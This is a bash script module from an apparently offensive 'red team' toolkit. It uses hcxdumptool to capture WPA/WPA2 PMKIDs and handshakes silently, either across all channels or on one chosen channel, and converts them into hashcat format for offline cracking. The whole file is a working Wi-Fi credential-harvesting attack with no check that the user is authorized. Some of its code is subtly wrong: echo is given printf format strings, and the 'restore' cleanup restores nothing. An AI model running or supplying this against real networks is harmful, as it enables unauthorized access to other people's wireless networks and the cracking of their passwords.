#!/usr/bin/env bash
# HZ_NAME=Advanced PMKID & Handshake Harvester Suite
# HZ_DESC=Captures WPA/WPA2 PMKIDs and 4-way handshakes silently using hcxdumptool for offline analysis.
# HZ_VERSION=2.0.0
# HZ_AUTHOR=Higer23 & Advanced Cyber Lab

set -euo pipefail

# Cleanup handler for safe restoration of wireless interface states
cleanup_pmkid_ops() {
    echo -e "\n${YELLOW}[*] Restoring network interface states and stopping capture tools...${NC}"
    kill 0 2>/dev/null || true
    log_event "INFO" "PMKID Harvester module terminated safely and processes cleaned."
}

module_main() {
    trap cleanup_pmkid_ops INT TERM EXIT

    print_banner
    echo -e "${RED}[RED TEAM MODULE 2] Advanced PMKID & Handshake Harvester Suite${NC}"
    echo -e "${WHITE}Silently captures clientless PMKID hashes and active 4-way handshakes for tactical offline auditing.${NC}"
    log_event "INFO" "Initializing Red Team PMKID & Handshake Harvester Module."

    local target_iface="${LAB_INTERFACE:-wlan0mon}"
    echo -e "${YELLOW}[*] Active wireless interface: $target_iface${NC}"

    # Verify root privileges
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[ERROR] Red Team operations require root privileges (sudo).${NC}"
        log_event "ERROR" "Non-root execution attempted for PMKID harvester module."
        return 1
    fi

    # Dependency check for specialized tools
    for tool in hcxdumptool hcxpcapngtool iwconfig; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[ERROR] Required tool '$tool' is not installed. Install via: sudo apt install hcxdumptool hcxtools${NC}"
            log_event "ERROR" "Missing dependency: $tool"
            return 1
        fi
    done

    echo ""
    echo "Select Harvester Tactical Option:"
    echo "1. Autonomous PMKID Sweeper (Clientless Multi-Channel Attack via hcxdumptool)"
    echo "2. Targeted AP Handshake & PMKID Capture (Specific Channel Locked)"
    read -r -p "Select tactical option (1-2): " harvester_choice
    log_event "INFO" "PMKID harvester option chosen: $harvester_choice"

    local timestamp
    timestamp=$(date +%s)
    local raw_pcapng="${CAPTURE_DIR}/pmkid_raw_${timestamp}.pcapng"
    local converted_hash="${CAPTURE_DIR}/pmkid_hashes_${timestamp}.hc22000"

    HIGERZERO_SESSION_METRICS["pmkid_pcap"]="$raw_pcapng"
    HIGERZERO_SESSION_METRICS["pmkid_hash"]="$converted_hash"

    case "$harvester_choice" in
        1)
            echo -e "${GREEN}[+] Launching Autonomous PMKID Sweeper across spectrum...${NC}"
            log_event "SUCCESS" "Starting autonomous hcxdumptool PMKID capture."
            hcxdumptool -i "$target_iface" -w "$raw_pcapng" --enable_status=1
            ;;
        2)
            if [ -z "${TARGET_CHANNEL:-}" ]; then
                read -r -p "Enter Target Channel (e.g., 6): " TARGET_CHANNEL
            fi
            echo -e "${YELLOW}[*] Locking interface $target_iface to channel $TARGET_CHANNEL...${NC}"
            iwconfig "$target_iface" channel "$TARGET_CHANNEL" 2>/dev/null || true

            echo -e "${GREEN}[+] Launching Channel-Locked PMKID & Handshake Capture...${NC}"
            log_event "SUCCESS" "Starting channel-locked hcxdumptool capture on channel $TARGET_CHANNEL."
            hcxdumptool -i "$target_iface" -c "$TARGET_CHANNEL" -w "$raw_pcapng" --enable_status=1
            ;;
        *)
            echo -e "${YELLOW}[WARN] Invalid tactical option selected. Aborting operation.${NC}"
            log_event "WARN" "Invalid option provided in PMKID module."
            return 1
            ;;
    esac

    # Automatic Post-Processing Conversion for Hashcat / Aircrack
    if [ -f "$raw_pcapng" ] && [ -s "$raw_pcapng" ]; then
        echo -e "${YELLOW}[*] Converting captured pcapng stream into Hashcat-compatible format (.hc22000)...${NC}"
        log_event "INFO" "Converting raw pcapng capture to hc22000 format."
        
        hcxpcapngtool -o "$converted_hash" "$raw_pcapng" 2>/dev/null || true
        
        if [ -f "$converted_hash" ] && [ -s "$converted_hash" ]; then
            echo -e "${GREEN}┌─────────────────────────────────────────────────────────────────────────┐${NC}"
            echo -e "${GREEN}│ [SUCCESS] PMKID / HANDSHAKE HARVESTED & CONVERTED SUCCESSFULLY          │${NC}"
            echo -e "${GREEN}├─────────────────────────────────────────────────────────────────────────┤${NC}"
            echo -e "${WHITE}│ Raw Capture    : ${CYAN}%-54s${WHITE} │${NC}" "$raw_pcapng"
            echo -e "${WHITE}│ Hashcat Format : ${CYAN}%-54s${WHITE} │${NC}" "$converted_hash"
            echo -e "${GREEN}└─────────────────────────────────────────────────────────────────────────┘${NC}"
            log_event "SUCCESS" "PMKID hashes successfully generated at: $converted_hash"
        else
            echo -e "${YELLOW}[WARN] No valid PMKIDs or handshakes found inside the capture stream.${NC}"
            log_event "WARN" "Conversion finished but no valid hashes extracted."
        fi
    else
        echo -e "${YELLOW}[WARN] No capture file generated or capture stream was empty.${NC}"
        log_event "WARN" "PMKID capture resulted in empty or missing output file."
    fi

    sleep 2
}

# Module registration hook for HigerZero Zero-Registry
[[ "${BASH_SOURCE[0]}" == "${0}" ]] && module_main "$@"
